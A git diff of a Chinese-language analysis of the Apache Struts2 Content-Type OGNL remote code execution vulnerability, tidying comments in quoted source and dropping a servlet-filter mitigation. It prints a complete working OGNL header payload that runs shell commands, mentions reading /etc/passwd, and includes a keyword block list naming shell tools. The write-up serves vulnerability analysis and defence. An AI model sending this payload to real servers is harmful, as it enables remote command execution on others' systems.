@@ -54,12 +54,10 @@ public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
         this.prepare.setEncodingAndLocale(request, response);
         this.prepare.createActionContext(request, response);
         this.prepare.assignDispatcherToThread();
-<<<<<<< HEAD
         request = this.prepare.wrapRequest(request); 
         // Struts2对输入请求对象request的进行封装
-=======
-        request = this.prepare.wrapRequest(request); // Struts2对输入请求对象request的进行封装
->>>>>>> origin/master
+        request = this.prepare.wrapRequest(request); 
+        // Struts2对输入请求对象request的进行封装
         ActionMapping mapping = this.prepare.findActionMapping(request, response, true);
         if (mapping == null)
         {
@@ -143,12 +141,10 @@ public MultiPartRequestWrapper(MultiPartRequest multiPartRequest, HttpServletReq
     setLocale(request);
     try
     {
-<<<<<<< HEAD
       this.multi.parse(request, saveDir);  
       // parse函数进行解析request
-=======
-      this.multi.parse(request, saveDir);  // parse函数进行解析request
->>>>>>> origin/master
+      this.multi.parse(request, saveDir);  
+      // parse函数进行解析request
       for (String error : this.multi.getErrors()) {
         addError(error);
       }
@@ -189,12 +185,10 @@ public void parse(HttpServletRequest request, String saveDir)
       if (LOG.isWarnEnabled()) {
         LOG.warn("Unable to parse request", e, new String[0]);
       }
-<<<<<<< HEAD
       String errorMessage = buildErrorMessage(e, new Object[0]); 
       // 对捕获的异常进行处理
-=======
-      String errorMessage = buildErrorMessage(e, new Object[0]); // 对捕获的异常进行处理
->>>>>>> origin/master
+      String errorMessage = buildErrorMessage(e, new Object[0]); 
+      // 对捕获的异常进行处理
       if (!this.errors.contains(errorMessage)) {
         this.errors.add(errorMessage);
       }
@@ -294,12 +288,10 @@ public List<FileItem> parseRequest(RequestContext ctx)
     boolean successful = false;
     try
     {
-<<<<<<< HEAD
       FileItemIterator iter = getItemIterator(ctx); 
       // 跟踪getItemIterator(ctx)方法
-=======
-      FileItemIterator iter = getItemIterator(ctx); // 跟踪getItemIterator(ctx)方法
->>>>>>> origin/master
+      FileItemIterator iter = getItemIterator(ctx); 
+      // 跟踪getItemIterator(ctx)方法
       FileItemFactory fac = getFileItemFactory();
       if (fac == null) {
         throw new NullPointerException("No FileItemFactory has been set.");
@@ -364,12 +356,10 @@ public FileItemIterator getItemIterator(RequestContext ctx)
   {
     try
     {
-<<<<<<< HEAD
       return new FileItemIteratorImpl(ctx); 
       // 继续跟踪FileItemIteratorImpl(ctx)方法
-=======
-      return new FileItemIteratorImpl(ctx); // 继续跟踪FileItemIteratorImpl(ctx)方法
->>>>>>> origin/master
+      return new FileItemIteratorImpl(ctx); 
+      // 继续跟踪FileItemIteratorImpl(ctx)方法
     }
     catch (FileUploadIOException e)
     {
@@ -436,11 +426,7 @@ protected String buildErrorMessage(Throwable e, Object[] args)
 header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
 ```
 
-<<<<<<< HEAD
-通过#nike='multipart/form-data'语句使得后台判断语句content_type.contains("multipart/form-data")判断结果为true，以便攻击代码得以传入。同时将攻击代码'cat /etc/passwd'赋值给#cmd参数。接下来通过(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})来判断目标主机的操作系统类型，并选择性的进行指令赋值，最终，通过如下图代码，将攻击指令执行
-=======
 通过#nike='multipart/form-data'语句使得后台判断语句content_type.contains("multipart/form-data")判断结果为true，以便攻击代码得以传入。同时将攻击代码'cat /etc/passwd'赋值给#cmd参数。接下来通过(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})来判断目标主机的操作系统类型，并选择性的进行指令赋值，最终将攻击指令执行
->>>>>>> origin/master
 
 **批量检测POC执行效果**
 
@@ -472,91 +458,17 @@ header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@D
 
 - 方法二：
 
-<<<<<<< HEAD
   最保险的办法直接使用最新版struts2的jar包替换原jar文件进行升级，有三个包必须要升级（升级前备份原版本jar包）：
 
-  - Struts2-core-2.3.32.jar：struts2核心包，也是此漏洞发生的所在；
-  - xwork-core-2.3.32.jar：struts2依赖包，版本跟随struts2一起更新；
-  - ongl-3.0.19.jar：用于支持ognl表达式，为其他包提供依赖；
+-   Struts2-core-2.3.32.jar：struts2核心包，也是此漏洞发生的所在；
 
-  建议先在测试环境进行升级测试，查看是否会影响业务正常运行。
-=======
-  设置Servlet全局过滤器，校验Content-Type 值，过滤器参考如下： 
+-   xwork-core-2.3.32.jar：struts2依赖包，版本跟随struts2一起更新；
 
-  在 web.xml 中配置Filter
+-   ongl-3.0.19.jar：用于支持ognl表达式，为其他包提供依赖；
 
-  ```
-  <filter> 
-  filter-name>Struts2SecFilter</filter-name> 
-  filter-class>org.cysecurity.cspf.jvl.controller.Struts2SecFilter</filter-class>  //过滤
-  器servlet所在路径 
-  </filter> 
-  <filter-mapping> 
-  <filter-name>Struts2SecFilter</filter-name> 
-  <url-pattern>/fileUpload</url-pattern> //需要过滤的URL 
-  </filter-mapping>
-  ```
+     建议先在测试环境进行升级测试，查看是否会影响业务正常运行。
 
-  将过滤器java 源文件导入web.xml配置的路径，Struts2SecFilter.java代码如下：
-
-  ```java
-  package org.cysecurity.cspf.jvl.controller; 
-  import java.io.IOException; 
-  import java.util.Enumeration; 
-  import javax.servlet.Filter; 
-  import javax.servlet.FilterChain; 
-  import javax.servlet.FilterConfig; 
-  import javax.servlet.ServletException; 
-  import javax.servlet.ServletRequest; 
-  import javax.servlet.ServletResponse; 
-  import javax.servlet.http.HttpServletRequest; 
-  public class Struts2SecFilter implements Filter { 
-   public void destroy() { 
-    // TODO Auto-generated method stub 
-   } 
-   public void init(FilterConfig arg0) throws ServletException {  } 
-   public void doFilter(ServletRequest args0, ServletResponse args1, FilterChain 
-  chain) 
-     throws IOException, ServletException { 
-    HttpServletRequest req = (HttpServletRequest) args0; 
-    // 获得所有请求参数名 
-    Enumeration<String> params = req.getHeaderNames(); 
-    String ognl = ""; 
-    while (params.hasMoreElements()) { 
-     // 得到参数名 
-     String name = params.nextElement().toString(); 
-   System.out.println("name==========================="  + name + "--"); 
-     // 得到参数对应值 
-     String[] value = req.getParameterValues(name); 
-     for (int i = 0; i < value.length; i++) { 
-      ognl = ognl + value[i]; 
-     } 
-    } 
-    // 
-  System.out.println("============================SQL"+sql);           
-  if (ognlValidate(ognl)) { 
-     throw new IOException("您发送请求中的参数中含有非法字符"); 
-    } else { 
-     chain.doFilter(args0, args1); 
-    } 
-   } 
-   // 效验 
-   protected static boolean ognlValidate(String str) { 
-    str = str.toLowerCase();//  统一转为小写 
-    String badStr = "'|and|exec|ognl|%|#|cmd|bin|sh|bash|system";// 过滤掉的sql 关键字，可以手动添加 
-    String[] badStrs = badStr.split("\\|"); 
-    for (int i = 0; i < badStrs.length; i++) { 
-     if (str.indexOf(badStrs[i]) >= 0) { 
-      return true; 
-     } 
-    } 
-    return false; 
-   } 
-  }
-  ```
-
-  ​
->>>>>>> origin/master
+    ​
 
   ​
 
@@ -567,9 +479,3 @@ header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@D
 [http://blog.nsfocus.net/apache-struts2-remote-code-execution-vulnerability-analysis-program/](http://blog.nsfocus.net/apache-struts2-remote-code-execution-vulnerability-analysis-program/)
 
 **感谢我盟！感谢6哥！**
-
-<<<<<<< HEAD
-​
-=======
-​
->>>>>>> origin/master
